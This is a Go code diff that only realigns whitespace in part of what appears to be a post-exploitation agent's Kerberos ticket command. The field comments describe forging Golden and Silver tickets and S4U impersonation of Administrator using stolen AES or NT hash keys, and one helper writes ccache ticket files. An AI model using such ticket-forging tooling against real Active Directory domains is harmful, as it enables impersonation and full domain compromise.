@@ -39,19 +39,19 @@ func (c *TicketCommand) Description() string {
 }
 
 type ticketArgs struct {
-	Action      string `json:"action"`       // forge, request, s4u
-	Realm       string `json:"realm"`        // domain (e.g., CORP.LOCAL)
-	Username    string `json:"username"`     // target identity (e.g., Administrator)
-	UserRID     int    `json:"user_rid"`     // RID (default: 500 for Administrator)
-	DomainSID   string `json:"domain_sid"`   // domain SID (e.g., S-1-5-21-...)
-	Key         string `json:"key"`          // hex AES256 or NT hash key
-	KeyType     string `json:"key_type"`     // aes256, aes128, rc4 (default: aes256)
-	KVNO        int    `json:"kvno"`         // key version number (default: 2)
-	Lifetime    int    `json:"lifetime"`     // ticket lifetime in hours (default: 24)
-	Format      string `json:"format"`       // kirbi, ccache (default: kirbi)
-	SPN         string `json:"spn"`          // Silver Ticket: service/host, or S4U2Proxy: target SPN
-	Server      string `json:"server"`       // KDC address for request/s4u action
-	Impersonate string `json:"impersonate"`  // S4U: user to impersonate (e.g., Administrator)
+	Action      string `json:"action"`      // forge, request, s4u
+	Realm       string `json:"realm"`       // domain (e.g., CORP.LOCAL)
+	Username    string `json:"username"`    // target identity (e.g., Administrator)
+	UserRID     int    `json:"user_rid"`    // RID (default: 500 for Administrator)
+	DomainSID   string `json:"domain_sid"`  // domain SID (e.g., S-1-5-21-...)
+	Key         string `json:"key"`         // hex AES256 or NT hash key
+	KeyType     string `json:"key_type"`    // aes256, aes128, rc4 (default: aes256)
+	KVNO        int    `json:"kvno"`        // key version number (default: 2)
+	Lifetime    int    `json:"lifetime"`    // ticket lifetime in hours (default: 24)
+	Format      string `json:"format"`      // kirbi, ccache (default: kirbi)
+	SPN         string `json:"spn"`         // Silver Ticket: service/host, or S4U2Proxy: target SPN
+	Server      string `json:"server"`      // KDC address for request/s4u action
+	Impersonate string `json:"impersonate"` // S4U: user to impersonate (e.g., Administrator)
 }
 
 func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
@@ -431,7 +431,7 @@ func ticketToCCache(ticketBytes []byte, sessionKey types.EncryptionKey, username
 	// Header tag: deltatime (tag=1, length=8, value=0)
 	buf = binary.BigEndian.AppendUint16(buf, 1) // tag
 	buf = binary.BigEndian.AppendUint16(buf, 8) // length
-	buf = append(buf, 0, 0, 0, 0, 0, 0, 0, 0)  // 8 bytes of zero
+	buf = append(buf, 0, 0, 0, 0, 0, 0, 0, 0)   // 8 bytes of zero
 
 	// Default principal
 	buf = ccacheWritePrincipal(buf, realm, []string{username})
